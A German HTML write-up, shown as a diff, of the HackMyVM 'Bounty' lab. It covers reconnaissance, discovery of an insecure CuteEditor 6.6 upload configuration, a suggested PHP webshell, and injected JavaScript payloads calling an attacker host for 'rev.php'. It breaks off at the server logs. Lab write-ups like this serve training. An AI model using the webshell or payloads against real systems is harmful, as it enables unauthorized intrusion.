@@ -1,0 +1,465 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bounty - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Bounty - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <!-- HINWEIS: Klasse 'level-medium' wird verwendet, um GELB gemäß Anforderung zu erzwingen -->
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle level-medium-circle"> <!-- Zusätzliche Klasse für CSS-Targeting der Kreis-Farbe -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrund wird durch CSS gesteuert -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">php</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration (CuteEditor)</a></li>
+                 <li><a href="#exploitation-rce">Exploitation & Initial Access (RCE)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerk mittels `arp-scan -l`. Dieses Tool sendet ARP-Anfragen, um IP- und MAC-Adressen von Geräten im selben Netzwerksegment zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `arp-scan` findet erfolgreich ein Zielsystem mit der IP-Adresse `192.168.2.111`. Die zugehörige MAC-Adresse `08:00:27:e8:3d:c4` gehört laut OUI-Lookup (PCS Systemtechnik GmbH) zu Oracle VirtualBox, was darauf hindeutet, dass es sich um eine virtuelle Maschine handelt. Dies ist die primäre IP für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP `192.168.2.111` als Ziel für detailliertere Scans (Nmap, etc.) verwenden. Die MAC-Adresse notieren, bestätigt die Virtualisierungsumgebung.<br><strong>Empfehlung (Admin):</strong> Netzwerkmonitoring implementieren, um ARP-Scans zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.111</span>	<span class="command">08:00:27:e8:3d:c4</span>	<span class="command">PCS Systemtechnik GmbH</span> 
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird gegen die Ziel-IP `192.168.2.111` durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu sammeln. Der Hostname `bounty.hmv` wird hier bereits von Nmap aufgelöst, was impliziert, dass er zuvor in `/etc/hosts` eingetragen wurde.
+                *   `-sS`: SYN-Scan (Stealth).
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-T5`: Sehr schnelles Timing (riskant, potenziell ungenau/laut).
+                *   `-A`: Aggressiver Scan (OS-Erkennung, Version, Skripte, Traceroute).
+                *   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 22 (SSH):** Läuft OpenSSH 8.4p1 (Debian). Ein möglicher Zugangspunkt.
+                *   **Port 80 (HTTP):** Läuft Nginx 1.18.0. Die Webseite hat keinen Titel.
+            Die OS-Erkennung deutet auf ein Linux-System (Kernel 4.x/5.x) hin. Die MAC-Adresse bestätigt VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die offenen Ports SSH und HTTP sind die primären Angriffsvektoren. Den Webserver auf Port 80 genauer untersuchen (Verzeichnisse, Dateien, Anwendungen). SSH im Auge behalten für spätere Login-Versuche, falls Benutzerdaten gefunden werden.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur benötigte Ports offen sind. Nginx und OpenSSH aktuell halten und sicher konfigurieren (z.B. SSH mit Key-Authentifizierung und Fail2Ban).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 14:13 CEST
+Nmap scan report for bounty.hmv (192.168.2.111)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 7585675677e85ad8f049c55d7339c816 (RSA)
+|   256 b55dd87ec9ade6677d5ee3abb0a0faf3 (ECDSA)
+|_  256 dd11b9f8fdb6a59fd8d640c7db816367 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:E8:3D:C4 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms bounty.hmv (192.168.2.111)
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (CuteEditor)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.
+                *   `dir`: Modus für Verzeichnissuche.
+                *   `-u http://192.168.2.111`: Ziel-URL.
+                *   `-w ...directory-list-2.3-medium.txt`: Wortliste.
+                *   `-e`: Erweiterte URL-Ausgabe.
+                *   `-x ...`: Lange Liste von Dateiendungen.
+                *   `-t 100`: Hohe Anzahl von Threads.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet diverse Dateien und Verzeichnisse:
+                *   Standarddateien: `index.html`, `index.php`, `default.htm`.
+                *   Anwendungsbezogene Dateien/Verzeichnisse: `templates.php`, `demo.htm`, `template.htm`, `/document/`, `document.html`, `/Templates/`, `/Uploads/`, `localization.php`, `Deployment.htm`.
+                *   Eine interessante RTF-Datei: `/document/evaluation.rtf`.
+            Diese Funde deuten auf eine spezifische Webanwendung hin, möglicherweise einen Editor oder ein CMS.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Dateien und Verzeichnisse genauer untersuchen. `index.php`, `templates.php`, `localization.php` könnten Hinweise auf die verwendete Technologie geben. Die RTF-Datei herunterladen und analysieren (könnte Metadaten oder andere Informationen enthalten).<br><strong>Empfehlung (Admin):</strong> Nicht benötigte Dateien und Verzeichnisse vom Webserver entfernen. Verzeichnisauflistung deaktivieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">gobuster dir -u http://192.168.2.111 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe -t 100</span></div>
+                     <pre>
+<span class="command">http://192.168.2.111/index.html</span>           (Status: 200) [Size: 51]
+<span class="command">http://192.168.2.111/index.php</span>            (Status: 200) [Size: 470]
+<span class="command">http://192.168.2.111/default.htm</span>          (Status: 200) [Size: 7422]
+<span class="command">http://192.168.2.111/templates.php</span>        (Status: 200) [Size: 5920]
+<span class="command">http://192.168.2.111/demo.htm</span>             (Status: 200) [Size: 7488]
+<span class="command">http://192.168.2.111/template.htm</span>         (Status: 200) [Size: 3967]
+<span class="command">http://192.168.2.111/document</span>             (Status: 301) [Size: 169] [--> http://192.168.2.111/document/]
+<span class="command">http://192.168.2.111/document.html</span>        (Status: 200) [Size: 23]
+<span class="command">http://192.168.2.111/Templates</span>            (Status: 301) [Size: 169] [--> http://192.168.2.111/Templates/]
+<span class="command">http://192.168.2.111/Uploads</span>              (Status: 301) [Size: 169] [--> http://192.168.2.111/Uploads/]
+<span class="command">http://192.168.2.111/localization.php</span>     (Status: 200) [Size: 3444]
+<span class="command">http://192.168.2.111/Deployment.htm</span>       (Status: 200) [Size: 6495]
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Text enthält weitere Informationen, die wahrscheinlich aus der Analyse der zuvor gefundenen Dateien stammen:
+                *   Die RTF-Datei `/document/evaluation.rtf` wird erwähnt.
+                *   Ein Pfad zu einer CuteEditor-Datei: `/cuteeditor_files/include_CuteEditor.php`. Dies identifiziert die verwendete Software als **CuteEditor**.
+                *   Ein Kommentar in `index.html` verweist auf einen PHP-Befehl: `/usr/bin/php /var/www/html/document.html`. Dies ist sehr ungewöhnlich und deutet darauf hin, dass `document.html` serverseitig als PHP ausgeführt wird.
+                *   Ein Kommentar in `index.php` bestätigt **CuteEditor Version 6.6**.
+                *   Ein langer Base64-String wird gefunden und dekodiert. Das Ergebnis ist eine Pipe-separierte Konfigurationszeile, die Upload-Pfade (`/Uploads`, `/Templates`), Größenbeschränkungen und erlaubte Dateiendungen für verschiedene Kategorien (Bilder, Medien, Dateien) definiert. Es sind viele Dateitypen erlaubt, darunter `.php`, `.htm`, `.html` unter "Files".
+                *   Der Inhalt von `document.html` wird gezeigt: Es enthält nur `<?php phpinfo(); ?>`.
+                *   Ein Verweis auf `Get_HtmlContent.php` wird gemacht.
+                *   Ein JavaScript-Schnipsel zur Initialisierung von CuteEditor (`CuteEditorInitialize`) wird gezeigt. Dieser enthält erneut den Base64-kodierten Konfigurationsstring unter dem Parameter `EditorSetting`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Funde sind extrem wichtig:
+                1.  **Identifikation:** Die Anwendung ist CuteEditor Version 6.6.
+                2.  **Fehlkonfiguration/Schwachstelle 1:** `document.html` wird als PHP ausgeführt und enthält `phpinfo()`. Der Aufruf von `http://192.168.2.111/document.html` wird detaillierte Server- und PHP-Konfigurationsinformationen preisgeben.
+                3.  **Fehlkonfiguration/Schwachstelle 2:** Die Base64-dekodierte Konfiguration zeigt, dass das Upload-Verzeichnis `/Uploads` ist und **`.php`, `.htm`, `.html` unter den erlaubten Dateiendungen für den Datei-Upload sind**. Dies ist eine kritische Schwachstelle, die wahrscheinlich das Hochladen einer Webshell ermöglicht.
+                4.  Die Pfade `/Uploads` und `/Templates` sind bekannt.
+                5.  Die Konfigurationsdetails (Base64) sind im Frontend (JavaScript) exponiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  `http://192.168.2.111/document.html` aufrufen, um `phpinfo()`-Ausgabe zu analysieren (PHP-Version, Module, Konfigurationen wie `allow_url_fopen`, `allow_url_include`).
+                2.  Nach einer Upload-Funktion in CuteEditor suchen (wahrscheinlich im Editor selbst).
+                3.  Versuchen, eine einfache PHP-Webshell (z.B. `<?php system($GET['cmd']); ?>`) in eine Datei mit einer erlaubten Endung (z.B. `.php`, `.html`) zu speichern und über die Upload-Funktion in das Verzeichnis `/Uploads` hochzuladen.
+                4.  Die hochgeladene Shell über `http://192.168.2.111/Uploads/shell.php` (oder ähnlich) aufrufen, um RCE zu erlangen.<br>
+            <strong>Empfehlung (Admin):</strong>
+                1.  **CuteEditor dringend aktualisieren oder ersetzen.** Version 6.6 ist alt und bekannt für Schwachstellen.
+                2.  Die Konfiguration von CuteEditor überprüfen und das Hochladen von ausführbaren Dateitypen (`.php`, `.html`, `.htm` etc.) **verbieten**. Nur absolut notwendige, ungefährliche Dateitypen erlauben.
+                3.  `document.html` entfernen oder sicherstellen, dass `.html`-Dateien nicht als PHP ausgeführt werden. `phpinfo()` niemals auf produktiven Systemen zugänglich lassen.
+                4.  Sensible Konfigurationen (wie der Base64-String) nicht im Frontend-Code preisgeben.</p>
+             <!-- Analyse der Dateiinhalte -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da dies Analyse/Zusammenfassung ist -->
+                     <pre>
+<span class="command">http://192.168.2.111/document/evaluation.rtf</span>       (Status: 200) [Size: 13276]´
+
+<span class="command">http://192.168.2.111/cuteeditor_files/include_CuteEditor.php</span>
+=
+ 
+<span class="command">http://192.168.2.111/index.html</span>
+     /usr/bin/php /var/www/html/document.html
+
+<span class="command">http://192.168.2.111/index.php</span>
+      <!-- CuteEditor Version 6.6 Editor1 
+</pre>
+                  </div>
+            </div>
+            <!-- Base64 Dekodierung -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">echo "MzAwfDEwMDAwfDEwMDB8MTAwMHwxMDAwfC9VcGxvYWRzfC9VcGxvYWRzfC9VcGxvYWRzfC9UZW1wbGF0ZXN8L1VwbG9hZHN8dHJ1ZXx0cnVlfHRydWV8dHJ1ZXwuanBnLC5qcGVnLC5naWYsLnBuZ3wuYXZpLC5tcGcsLm1wZWcsLm1wMywud2F2LC53bXZ8LnR4dCwuZG9jLC5wZGYsLnppcCwucmFyLC5hdmksLm1wZywubXBlZywuanBnLC5qcGVnLC5naWYsLnBuZywuaHRtfC5odG1sLC5odG18ZW4tZW58fHx8fHxmYWxzZXw=" | base64 -d</span></div>
+                     <pre>
+<span class="password">300|10000|1000|1000|1000|/Uploads|/Uploads|/Uploads|/Templates|/Uploads|true|true|true|true|.jpg,.jpeg,.gif,.png|.avi,.mpg,.mpeg,.mp3,.wav,.wmv|.txt,.doc,.pdf,.zip,.rar,.avi,.mpg,.mpeg,.jpg,.jpeg,.gif,.png,.htm|.html,.htm|en-en||||||false|</span>
+</pre>
+                  </div>
+            </div>
+            <!-- document.html Inhalt -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da dies Dateianalyse ist -->
+                    <pre>
+<span class="command">http://192.168.2.111/document.html</span>
+ 
+phpinfo();
+ 
+</pre>
+                 </div>
+            </div>
+            <!-- Get_HtmlContent.php Analyse -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da dies Dateianalyse ist -->
+                    <pre>
+<span class="command">http://192.168.2.111/Get_HtmlContent.php</span>
+ 
+onload =  "CuteEditorInitialize('CE_Editor1_ID',
+{... <span class="comment">[gekürzt für Lesbarkeit]</span> ...
+'EditorSetting':'<span class="command">MzAwfDEwMDAwfDEwMDB8MTAwMHwxMDAwfC9VcGxvYWRzfC9VcGxvYWRzfC9VcGxvYWRzf
+C9UZW1wbGF0ZXN8L1VwbG9hZHN8dHJ1ZXx0cnVlfHRydWV8dHJ1ZXwuanBnLC5qcGVnLC5naWYsLnBuZ3wuYXZpLC5tcGcsLm1wZWcsLm1wM
+ywud2F2LC53bXZ8LnR4dCwuZG9jLC5wZGYsLnppcCwucmFyLC5hdmksLm1wZywubXBlZywuanBnLC5qcGVnLC5naWYsLnBuZywuaHRtfC5od
+G1sLC5odG18ZGUtZGV8fHx8fHxmYWxzZXw=</span>'})"
+</pre>
+                  </div>
+            </div>
+             <!-- Dekodierte Config erneut zur Verdeutlichung -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+<span class="password">300|10000|1000|1000|1000|/Uploads|/Uploads|/Uploads|/Templates|/Uploads|true|true|true|true|
+.jpg,.jpeg,.gif,.png|.avi,.mpg,.mpeg,.mp3,.wav,.wmv|.txt,.doc,.pdf,.zip,.rar,.avi,.mpg,.mpeg,.jpg,.jpeg,.gif,.png,
+.htm|.html,.htm|de-de||||||false|</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird erneut ausgeführt, diesmal mit einer älteren Version (v2.1.6, vorher v2.5.0) und ohne spezifische Optionen wie `-C all`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Nikto-Ausgabe liefert weniger detaillierte Informationen als die vorherige. Sie bestätigt den Nginx-Server und meldet erneut fehlende Security-Header (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`) sowie das unsichere `PHPSESSID`-Cookie. Sie findet auch die multiplen Index-Dateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt frühere Funde, liefert aber keine neuen Erkenntnisse. Der vorherige Scan war informativer.<br><strong>Empfehlung (Admin):</strong> Fehlende Security-Header implementieren und Cookies sichern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nikto -h 192.168.2.111</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.111
++ Target Hostname:    192.168.2.111
++ Target Port:        80
++ Start Time:         2022-10-25 14:35:56 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ The anti-clickjacking <span class="command">X-Frame-Options header is not present.</span>
++ The <span class="command">X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ The <span class="command">X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie <span class="command">PHPSESSID created without the httponly flag</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">Multiple index files found: /default.htm, /index.php, /index.html</span>
++ 7915 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-10-25 14:36:11 (GMT2) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit` wird verwendet, um nach bekannten Exploits für "CuteEditor" zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `searchsploit` findet einen relevanten Eintrag: `CuteEditor for PHP 6.6 - Directory Traversal` (`php/webapps/50994.txt`). Obwohl die primäre Schwachstelle der unsichere Dateiupload zu sein scheint, ist es gut zu wissen, dass auch eine Directory-Traversal-Schwachstelle in dieser Version existiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Fokus auf den unsicheren Dateiupload legen, da dieser wahrscheinlich direkt zu RCE führt. Die Directory-Traversal-Schwachstelle als Backup-Option oder zur weiteren Informationsgewinnung (Lesen von Konfigurationsdateien) im Hinterkopf behalten.<br><strong>Empfehlung (Admin):</strong> CuteEditor aktualisieren oder ersetzen, um *alle* bekannten Schwachstellen zu beheben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">searchsploit CuteEditor</span></div>
+                     <pre>
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+<span class="password">CuteEditor for PHP 6.6 - Directory Traversal                                        | php/webapps/50994.txt</span>
+------------------------------------------------------------------------------------ ---------------------------------
+S
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (Subdomains) zu suchen, indem der `Host`-Header gefuzzt wird. Die Optionen `--hc 404 --hh 157` sollen uninteressante Antworten herausfiltern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine Ergebnisse (`Filtered Requests: 220565`). Es scheint keine anderen virtuellen Hosts auf diesem Server zu geben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Suche nach Subdomains war erfolglos. Konzentration auf die Hauptanwendung und die bekannte IP.<br><strong>Empfehlung (Admin):</strong> Keine spezifischen Maßnahmen erforderlich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u bounty.hmv -H "Host: http://FUZZ.bounty.hmv" --hc 404 --hh 157</span></div>
+                     <pre>
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                              
+=====================================================================
+
+Total time: 0
+Processed Requests: 220565
+Filtered Requests: 220565
+Requests/sec.: 0
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `curl -I` werden die Header für das Verzeichnis `/cuteeditor_files` abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Antwort ist `301 Moved Permanently` mit einem `Location`-Header, der auf `http://192.168.2.111/cuteeditor_files/` (mit abschließendem Slash) verweist. Dies bestätigt die Existenz des Verzeichnisses.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieses Verzeichnis mit `gobuster` weiter untersuchen, um die interne Struktur und potenziell interessante Dateien von CuteEditor zu finden.<br><strong>Empfehlung (Admin):</strong> Zugriff auf interne Verzeichnisse von Webanwendungen einschränken, wenn möglich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl -I "http://192.168.2.111//cuteeditor_files"</span></div>
+                     <pre>
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.18.0
+Date: Tue, 25 Oct 2022 12:56:26 GMT
+Content-Type: text/html
+Content-Length: 169
+<span class="command">Location: http://192.168.2.111/cuteeditor_files/</span>
+Connection: keep-alive
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut ausgeführt, diesmal gezielt auf das Verzeichnis `/cuteeditor_files`, um dessen Inhalt zu enumerieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet mehrere Unterverzeichnisse (`Images`, `Help`, `Themes`, `Languages`, `Scripts`, `Style`, `Configuration`) und einige PHP-Dateien (`template.php`, `Scripts/resource.php`). Das `Configuration`-Verzeichnis mit den Unterverzeichnissen `Security` und `Shared` ist besonders interessant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `Configuration`-Verzeichnis und seine Unterverzeichnisse weiter untersuchen. Konfigurationsdateien könnten sensible Informationen enthalten. Die gefundenen PHP-Dateien auf Schwachstellen prüfen.<br><strong>Empfehlung (Admin):</strong> Zugriff auf Konfigurationsverzeichnisse und -dateien von Webanwendungen über den Webserver blockieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">gobuster dir -u "http://192.168.2.111/cuteeditor_files" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,htm -t 100</span></div>
+                     <pre>
+<span class="command">http://192.168.2.111/cuteeditor_files/Images</span>               (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Images/]
+<span class="command">http://192.168.2.111/cuteeditor_files/template.php</span>         (Status: 200) [Size: 291]
+<span class="command">http://192.168.2.111/cuteeditor_files/license</span>              (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/license/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Help</span>                 (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Help/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Themes</span>               (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Themes/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Languages</span>            (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Languages/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Scripts</span>              (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Scripts/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Style</span>                (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Style/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Configuration</span>        (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Configuration/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Scripts/resource.php</span>               (Status: 200) [Size: 0]
+<span class="command">http://192.168.2.111/cuteeditor_files/Configuration/Security</span>             (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Configuration/Security/]
+<span class="command">http://192.168.2.111/cuteeditor_files/Configuration/Shared</span>               (Status: 301) [Size: 169] [--> http://192.168.2.111/cuteeditor_files/Configuration/Shared/]
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer `gobuster`-Scan wird auf das Verzeichnis `/cuteeditor_files/Themes` durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe dieses Scans fehlt im Text. Es ist unklar, was hier gefunden wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Enumeration der CuteEditor-Verzeichnisse fortsetzen, insbesondere `/Configuration`.<br><strong>Empfehlung (Admin):</strong> Zugriff auf interne Anwendungsverzeichnisse beschränken.</p>
+             
+        </section>
+
+        <section id="exploitation-rce">
+             <h2>Exploitation & Initial Access (RCE)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Text zeigt nun Versuche, eine Schwachstelle auszunutzen, wahrscheinlich im Zusammenhang mit CuteEditor, auch wenn der exakte Vektor nicht klar dokumentiert ist.
+                *   Es werden JavaScript-Payloads gezeigt (new Image()...`, `a href=...`, `window.location...`), die auf eine Ressource (`rev.php`) auf einem vom Angreifer kontrollierten Server (`192.168.2.153:4444`) verweisen. Dies deutet auf Versuche hin, Cross-Site Scripting (XSS) oder eine ähnliche Injection-Schwachstelle auszunutzen, möglicherweise in `localization.php` (wie die URL am Ende des Snippets andeutet).
+                *   Ein einfacher PHP Development Server wird auf dem Angreifer-System (`192.168.2.153`?) auf Port `4444` gestartet, um die eingehenden Anfragen (verursacht durch die JS-Payloads) zu empfangen und zu loggen. Die Logs zeigen erfolgreiche GET-Anfragen für `/rev.php` vom Zielsystem (hier fälschlicherweise als `192.168.2.153` geloggt, sollte `192.168.2.111` sein).
+                *   **Wichtiger Sprung:** Der Text geht dann direkt zum Starten eines Netcat-Listeners (`nc -lvnp 9001`) über, der sofort eine Verbindung erhält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der genaue Weg zur RCE ist unklar. Die XSS/Injection-Versuche scheinen stattgefunden zu haben, aber es ist nicht dokumentiert, wie diese zur Ausführung einer Reverse Shell führten. Möglicherweise wurde die zuvor identifizierte Schwachstelle im **Dateiupload von CuteEditor** (erlaubt `.php`) ausgenutzt, um eine Shell hochzuladen, und die Ausführung erfolgte dann (der Text überspringt diesen entscheidenden Teil). **Der Netcat-Listener auf Port 9001 empfängt erfolgreich eine Verbindung.** Die anschließende `id`-Abfrage in der Shell zeigt `<span class="password">root</span>`! Dies bedeutet, dass der Exploit **direkt zu einer Root-Shell** geführt hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl der genaue Exploit-Pfad fehlt, wurde erfolgreich Root-Zugriff erlangt. Die wahrscheinlichste Ursache ist eine RCE-Schwachstelle im CuteEditor (z.B. unsicherer Dateiupload), die direkt im Kontext des Webservers (`nginx`? `php-fpm`?) lief, welcher hier fälschlicherweise als `root` konfiguriert war (oder der Exploit nutzte eine zusätzliche lokale Privilegieneskalation aus).<br><strong>Empfehlung (Admin):</strong> **Massive Sicherheitslücke!** Webserver und PHP-Prozesse dürfen niemals als `root` laufen. CuteEditor patchen/ersetzen. Dateiuploads extrem restriktiv handhaben. PHP-Server härten (z.B. `disable_functions` in `php.ini`).</p>
+            <!-- XSS/Injection Versuche -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+new Image() src="http://192.168.2.153:4444/rev.php"
+href="http://192.168.2.153:4444/rev.php" "Visit W3Schools"
+<span class="command">http://192.168.2.111/localization.php?CustomCulture=%3Ca%20href=%22http://192.168.2.153:4444/rev.php%22%3EVisit%20W3Schools%3C/a%3E</span>
+	
+ window.location.replace("http://192.168.2.153:4444/rev.php") 
+</pre>
+                  </div>
+            </div>
+            <!-- PHP Server Logs -->
+            <div class="code-block">
+                 <div class="terminal">
